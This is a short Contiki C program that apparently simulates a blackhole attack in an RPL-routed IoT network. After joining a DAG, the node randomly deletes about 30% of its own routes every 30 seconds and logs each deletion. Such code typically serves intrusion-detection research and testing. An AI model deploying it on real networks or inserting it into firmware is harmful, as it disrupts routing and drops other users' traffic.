#include "contiki.h"
#include "lib/random.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/ipv6/uip-ds6-route.h"
#include <stdio.h>

PROCESS(blackhole_attack_process, "Blackhole Attack");
AUTOSTART_PROCESSES(&blackhole_attack_process);

PROCESS_THREAD(blackhole_attack_process, ev, data) {
  static struct etimer timer;
  PROCESS_BEGIN();

  printf("Blackhole Attack Started on Mote %u\n", (unsigned)linkaddr_node_addr.u8[0]);

  rpl_timers_schedule_periodic_dis();

  printf("Waiting to join an RPL DAG...\n");
  while(rpl_get_any_dag() == NULL) {
    etimer_set(&timer, CLOCK_SECOND);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    printf(".");
  }
  printf("\nJoined a DAG!\n");

  etimer_set(&timer, CLOCK_SECOND * 30);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

    uip_ds6_route_t *r;
    uip_ds6_route_t *next;

    for(r = uip_ds6_route_head(); r != NULL; r = next) {
      next = uip_ds6_route_next(r);

      if((random_rand() % 100) < 30) { 
        printf("Blackhole: Deleting route on mote %u -> ", (unsigned)linkaddr_node_addr.u8[0]);
        uip_ds6_route_rm(r);
        printf(" done\n");
      }
    }

    etimer_reset(&timer);
  }
  PROCESS_END();
}

